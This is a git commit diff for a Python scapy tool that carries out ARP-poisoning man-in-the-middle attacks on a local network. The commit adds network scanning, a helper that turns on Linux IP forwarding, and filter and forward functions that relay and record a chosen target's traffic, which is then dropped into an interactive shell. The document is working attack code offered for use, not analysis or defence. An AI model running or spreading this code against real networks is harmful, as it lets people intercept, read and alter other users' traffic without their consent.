a1fddb96d69f78b45a70a04e1d6355ed29c2bcff
Amit Gold <amit.gold00@gmail.com>
2020-08-09 21:40:33 +0300

    Clean working tree

--- intercept_torrents.py
+++ intercept_torrents.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from scapy.all import *
-from mitm import MITMAttack
+from mitm import MITMAttack, LinuxPortForwarding
+import subprocess
 
 def filter_out_torrent(p):
     torrent_ports = list(range(6881, 6889+1)) + [6969, 4662]  # + [bittorrent tracker, eDonkey]
@@ -11,15 +12,37 @@ def filter_out_torrent(p):
     else:
         return p
 
+def get_network_mask():
+    ip_addr = subprocess.run(["ip", "addr"], stdout=subprocess.PIPE).stdout.decode('utf-8')
+    inet_line = [line for line in ip_addr.split("\n") if conf.iface in line and "inet" in line][0]
+    return inet_line.split()[1]
+
+def scan_network(network):
+    print("Scanning network...")
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=False)
+    print("Devices in network:")
+    for _, packet in ans:
+        print(f"    {packet.psrc} at {packet.hwsrc}")
+
 def main():
+    network = get_network_mask()
+    print("Network mask:", network)
+
+    target = input("Target's IP (empty to scan network): ")
+    while target == "":
+        scan_network(network)
+        target = input("Target's IP (empty to re-scan): ")
+
     mitm = MITMAttack(
-            target_ip=input("Target's IP: "),
-            user_filter=filter_out_torrent,
-            verbose=False)
-    with mitm as resp:
-        packets = resp
+            target_ip=target,
+            # user_filter=filter_out_torrent,
+            verbose=True)
+    with LinuxPortForwarding():
+        packets = mitm.run()
+    # TODO: remove
+    x = packets.filter(lambda p: IP in p and (p[IP].src == target or p[IP].dst == target))
     import code
-    code.interact(local=locals())
+    code.interact(local=locals(), banner=f"{len(packets)} packets in variable `packets`")
 
 if __name__ == "__main__":
     main()
--- mitm.py
+++ mitm.py
@@ -2,6 +2,26 @@ from scapy.all import *
 from threading import Thread
 import time
 
+PORT_FORWARD_FILE = "/proc/sys/net/ipv4/ip_forward"
+
+class LinuxPortForwarding:
+    """A utility class for setting up and removing the ability for this computer
+    to forward packets. This is neccesary for MITMAttack to work.
+    Example usage:
+    >>> with LinuxPortForwarding():
+    ...     packets = MITMAttack(...).run()
+    """
+    def __enter__(self):
+        with open(PORT_FORWARD_FILE, "r") as f:
+            self.previous_state = f.read()
+        with open(PORT_FORWARD_FILE, "w") as f:
+            f.write("1")
+
+    def __exit__(self, type, value, traceback):
+        with open(PORT_FORWARD_FILE, "w") as f:
+            f.write(self.previous_state)
+        return False
+
 class MITMAttack:
     """Represents an ARP MITM attack, including poisoning and restoring.
     Example usage: (no timeout or such specified,
@@ -10,7 +30,20 @@ class MITMAttack:
     ...     packets.summary()
     ...     # After this line, the ARP state will be restored
 
-    Note that the "with" block will not start running until the attack finishes running.  """
+    Note that the "with" block will not start running until the sniff finishes running.
+    Alternatively, if you don't need to do anything while the attack is still running:
+    >>> packets = MITMAttack(target_ip="10.0.0.2").run()
+    ... packets.summary()
+
+    This is equivalent to the previous example, except the ARP poison is restored
+    before the packets.summary() line runs.
+
+    A single MITMAttack object can be re-used several times to run the attack with
+    the same parameters as long as no network changes happened (for example the
+    target changing its IP)
+
+    Also see LinuxPortForwarding class - required unless the port forwarding file is set manually
+    """
     def __init__(self,
                  target_ip,
                  sniff_params={},
@@ -39,9 +72,9 @@ class MITMAttack:
         self.verbose = verbose
 
         if self.verbose:
-            print(f"Local: {self.local_ip.ljust(IP_LENGTH)}, {self.local_mac}")
+            print(f"Local:   {self.local_ip.ljust(IP_LENGTH)}, {self.local_mac}")
             print(f"Gateway: {self.gateway_ip.ljust(IP_LENGTH)}, {self.gateway_mac}")
-            print(f"Target: {self.target_ip.ljust(IP_LENGTH)}, {self.target_mac}")
+            print(f"Target:  {self.target_ip.ljust(IP_LENGTH)}, {self.target_mac}")
 
     def __enter__(self):
         def poison_targets_async():
@@ -54,23 +87,29 @@ class MITMAttack:
                 poison_target(self.gateway_ip, self.gateway_mac, self.target_ip, self.local_mac, verbose=self.verbose)
                 time.sleep(2)
 
-        poison_thread = threading.Thread(target=poison_targets_async)
+        self.poison_thread = threading.Thread(target=poison_targets_async)
         if self.verbose: print("Launching poisoning thread.")
-        poison_thread.start()
+        self.poison_thread.start()
 
-        packets = bridge_and_sniff(
-                if1=conf.iface,
-                if2=conf.iface,
-                xfrm12=mitm_forward(self.target_mac, self.target_ip, self.local_mac, self.local_ip,
-                    self.gateway_mac, self.gateway_ip, self.user_filter),
+        packets = sniff(
+                prn=mitm_forward(self.local_mac, self.local_ip, self.target_mac, self.target_ip, self.gateway_mac, self.gateway_ip, self.user_filter),
+                lfilter=mitm_filter(self.local_mac, self.local_ip, self.target_mac, self.target_ip, self.gateway_mac, self.gateway_ip),
                 **self.sniff_params,
                 )
-        poison_thread.running = False
+
+        # TODO: patch these packets to look like target -> gateway without local_mac at all?
+        # Could help with analyzing sessions
+        for packet in packets:
+            if packet[Ether].src == self.target_mac:
+                packet[Ether].dst = self.gateway_mac
+            if packet[Ether].src == self.gateway_mac:
+                packet[Ether].dst = self.target_mac
 
         return packets
 
     def __exit__(self, type, value, traceback):
         if self.verbose: print("Restoring")
+        self.poison_thread.running = False
         # Restore target and gateway to talk to each other
         poison_target(self.target_ip, self.target_mac,
                 self.gateway_ip, self.gateway_mac, verbose=self.verbose)
@@ -78,14 +117,31 @@ class MITMAttack:
                 self.target_ip, self.target_mac, verbose=self.verbose)
         return False  # re-raise if there's an exception
 
+    def run(self):
+        """Run the attack and return captured packets.
+        Equivalent to running it with `with` and doing nothing in the block.
+        So:
+        >>> with MITMAttack(...) as result: pass
+
+        And
+        >>> result = MITMAttack(...).run()
+
+        Are equivalent.
+        """
+        with self as res: pass
+        return res
+
 IP_LENGTH = 15
 
 def get_mac(target_ip, verbose=False):
     if verbose: print(f"Getting {target_ip}'s mac...")
     # Fun fact - this is already implemented in scapy function called getmacbyip
     arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)  # op=1 is WHO(mac) HAS this ip
-    response = srp(arp_broadcast, verbose=False)
-    response = response[0][0][1]  # op should be 2 which means IS AT
+    response = srp(arp_broadcast, verbose=False, timeout=2, retry=5)
+    try:
+        response = response[0][0][1]  # op should be 2 which means IS AT
+    except IndexError:
+        raise Exception(f"Couldn't look up mac of {target_ip}")
     return response.hwsrc
 
 def poison_target(target_ip, target_mac, ip, mac, verbose=True):
@@ -95,8 +151,8 @@ def poison_target(target_ip, target_mac, ip, mac, verbose=True):
     poison = ARP(op=2, hwsrc=mac, psrc=ip, pdst=target_ip, hwdst=target_mac)
     send(poison, verbose=False)
 
-def mitm_forward(target_mac, target_ip, local_mac, local_ip, gateway_mac, gateway_ip, user_filter):
-    def convert(p):
+def mitm_filter(local_mac, local_ip, target_mac, target_ip, gateway_mac, gateway_ip):
+    def filter(p):
         if IP not in p or Ether not in p: return False
         p_src_mac = p[Ether].src
         p_dst_mac = p[Ether].dst
@@ -104,24 +160,44 @@ def mitm_forward(target_mac, target_ip, local_mac, local_ip, gateway_mac, gatewa
         p_dst_ip  = p[IP].dst
 
         # target -> me -> gateway -> internet
-        if p_src_mac == target_mac and p_dst_mac == local_mac:
+        to_internet = p_src_mac == target_mac and p_dst_mac == local_mac and p_dst_ip != local_ip
+        # internet -> gateway -> me -> target
+        to_target = p_src_mac == gateway_mac and p_dst_mac == local_mac and p_dst_ip == target_ip
+        return to_target or to_internet
+    return filter
+
+def mitm_forward(local_mac, local_ip, target_mac, target_ip, gateway_mac, gateway_ip, user_filter):
+    def convert(p):
+        if IP not in p or Ether not in p: return False
+        p_src_mac = p[Ether].src
+        p_dst_mac = p[Ether].dst
+        p_src_ip  = p[IP].src
+        p_dst_ip  = p[IP].dst
+        # Don't have to check the exact path of the target because it's already checked in lfilter
+        if p_src_mac == target_mac:
+            # To gateway then internet
+            print("to internet")
             p[Ether].src = local_mac
             p[Ether].dst = gateway_mac
             p.direction = 1
-            try:
-                return user_filter(p)
-            except Exception as e:
-                print(e)
-        # internet -> gateway -> me -> target
-        elif p_src_mac == gateway_mac and p_dst_mac == local_mac and p_dst_ip == target_ip:
+            return user_filter(p)
+        elif p_src_mac == gateway_mac:
+            # From internet to target
+            print("to target")
             p[Ether].src = local_mac
             p[Ether].dst = target_mac
             p.direction = 0
-            try:
-                return user_filter(p)
-            except Exception as e:
-                print(e)
+            p.show()  # print
+            return user_filter(p)
         else:
-            return False
-    return convert
+            return None
+
+    def wrapper(p):
+        try:
+            p = convert(p)
+            if p: send(p, verbose=False)
+        except Exception as e:
+            print(e)
+
+    return wrapper
 
